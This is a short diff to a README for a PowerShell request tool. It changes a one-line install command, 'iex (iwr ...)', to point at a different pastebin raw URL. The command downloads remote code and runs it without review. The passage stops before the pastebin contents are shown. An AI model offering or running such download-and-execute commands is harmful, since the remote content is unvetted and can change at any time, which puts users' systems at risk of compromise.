@@ -3,7 +3,7 @@ Make request easily with an interface in one powershell line.
 This was entirely videcoded because I needed to test a server.
 Just use:
 ```powershell
-iex (iwr "https://pastebin.com/raw/H3N3SVR8")
+iex (iwr "https://pastebin.com/raw/vWf9EsWY")
 ```
 
 It uses a pastbin link that contains:
